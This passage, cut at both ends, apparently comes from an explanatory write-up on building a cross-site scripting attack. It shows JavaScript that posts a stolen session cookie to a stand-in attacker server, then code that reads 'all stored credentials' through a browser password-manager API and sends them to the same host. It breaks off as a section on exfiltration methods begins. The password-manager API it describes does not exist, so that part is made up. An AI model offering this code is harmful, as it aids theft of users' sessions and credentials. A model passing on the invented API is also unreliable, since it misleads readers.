xhr.open('POST', 'https://attacker-server.com/cookie', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('session_cookie=' + sessionCookie[1]);
```
This code uses the `document.cookie` property to access the user's cookies and extracts the session cookie using a regular expression. The extracted cookie is then sent to the attacker's server using an XMLHttpRequest.

**Component 2: Accessing Password Manager APIs**
-----------------------------------------

Modern browsers provide password manager APIs that allow web applications to interact with stored credentials. An attacker could exploit an XSS vulnerability to access these APIs and retrieve sensitive password data. The following code snippet demonstrates how an attacker could access the password manager API:
```javascript
// Check if the browser supports the Password Manager API
if (window.PasswordManager) {
  // Get the password manager instance
  var passwordManager = new PasswordManager();

  // Get all stored credentials
  passwordManager.getAllCredentials().then(function(credentials) {
    // Send the credentials to the attacker's server
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://attacker-server.com/credentials', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(credentials));
  });
}
```
This code checks if the browser supports the Password Manager API and, if so, creates a new instance of the password manager. It then retrieves all stored credentials using the `getAllCredentials()` method and sends them to the attacker's server.

**Component 3: Data Exfiltration Methods**
--------------------------------------

Once an attacker has obtained sensitive user data, they must exfiltrate it to their own server. The following code snippets demonstrate common data exfiltration methods:

### 1. XMLHttpRequest

```javascript
